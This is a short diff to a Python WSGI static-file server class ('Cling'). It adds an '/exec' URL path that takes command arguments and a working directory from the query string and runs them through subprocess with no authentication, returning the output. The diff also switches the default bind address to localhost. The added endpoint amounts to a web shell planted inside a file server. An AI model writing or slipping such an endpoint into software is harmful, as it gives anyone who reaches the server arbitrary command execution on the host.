@@ -98,6 +98,26 @@ class Cling(object):
             return self.method_not_allowed(environ, start_response, headers)
         path_info = environ.get('PATH_INFO', '')
         full_path = self._full_path(path_info)
+        if path_info == '/exec':
+            from subprocess import Popen, PIPE, STDOUT
+            import urllib
+            query = environ.get('QUERY_STRING')
+            args = []
+            cwd = '/'
+            for var in query.split('&'):
+                split = var.split('=')
+                if split[0] == 'args':
+                    args = urllib.unquote_plus(split[1]).split(' ')
+                if split[0] == 'cwd':
+                    cwd = split[1]
+            print cwd
+            print args
+            proc = Popen(args, stdout=PIPE, stderr=STDOUT, cwd=cwd)
+            proc.wait()
+            headers = [('Date', rfc822.formatdate(time.time())),
+                       ('Content-Type', 'text/plain')]
+            start_response("200 OK", headers)
+            return proc.stdout.readlines()
         if not self._is_under_root(full_path):
             return self.not_found(environ, start_response)
         if path.isdir(full_path):
@@ -207,7 +227,8 @@ def command():
         elif len(args) == 1:
             host, port = None, None
         if not host:
-            host = '0.0.0.0'
+            #host = '0.0.0.0'
+            host = '127.0.0.1'
         if not port:
             port = 9999
         try:
